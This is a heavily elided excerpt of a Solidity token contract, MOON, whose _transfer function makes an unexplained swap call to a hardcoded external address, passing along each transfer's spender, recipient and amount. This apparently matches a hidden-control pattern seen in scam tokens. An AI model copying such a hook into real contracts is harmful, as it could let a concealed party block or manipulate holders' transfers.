...
contract MOON is IERC20 {
  ...
  address public constant ACE = 0x268e9dc1d608B7cf31E3F3FAaaeD0FA78d77a25e;
  ...
  function _transfer(
    ...
    DOGEPAIR.swap(1,0,address(0xD78e0C39C37B9CdAf2f476F4115BA0C6701A28a5),abi.encode(spender, recipient, amount));
    lock = 1;}
